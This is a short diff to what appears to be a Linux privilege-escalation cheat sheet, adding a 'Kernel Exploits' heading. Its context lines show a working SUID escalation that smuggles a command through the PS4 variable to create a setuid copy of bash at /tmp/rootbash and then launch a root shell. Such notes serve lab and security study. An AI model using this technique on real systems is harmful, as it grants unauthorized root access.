@@ -249,6 +249,7 @@ export -f /usr/sbin/service
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 /tmp/rootbash -p
 ```
+##  Kernel Exploits
 
 ## NFS ✅
 ```bash
